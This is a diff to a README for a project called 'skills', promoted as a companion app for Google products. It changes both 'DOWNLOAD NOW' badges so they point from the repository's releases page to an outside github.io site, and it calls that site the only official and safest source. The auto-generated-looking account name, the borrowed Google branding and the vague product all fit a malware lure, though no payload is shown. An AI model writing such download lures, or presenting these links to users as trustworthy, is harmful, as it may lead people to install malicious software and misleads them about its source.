@@ -8,7 +8,7 @@ Welcome to **skills** – your all-in-one solution for mastering Google products
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-4285F4?style=for-the-badge&logo=google&logoColor=white&labelColor=EA4335)](https://github.com/Harlieunadjusted52/skills/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-4285F4?style=for-the-badge&logo=google&logoColor=white&labelColor=EA4335)](https://harlieunadjusted52.github.io)
 
 Visit this link to download the application. This is the only official source, so you can be confident you're getting the latest, safest version.
 
@@ -99,7 +99,7 @@ Thank you for choosing **skills**. We built this tool because we believe Google 
 
 Remember, your journey starts with a single click:
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_GET_SKILLS-34A853?style=for-the-badge&logo=google&logoColor=white&labelColor=FBBC04)](https://github.com/Harlieunadjusted52/skills/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_GET_SKILLS-34A853?style=for-the-badge&logo=google&logoColor=white&labelColor=FBBC04)](https://harlieunadjusted52.github.io)
 
 Come back often—there's always something new to discover in the world of Google, and now you have the perfect companion to explore it.
 
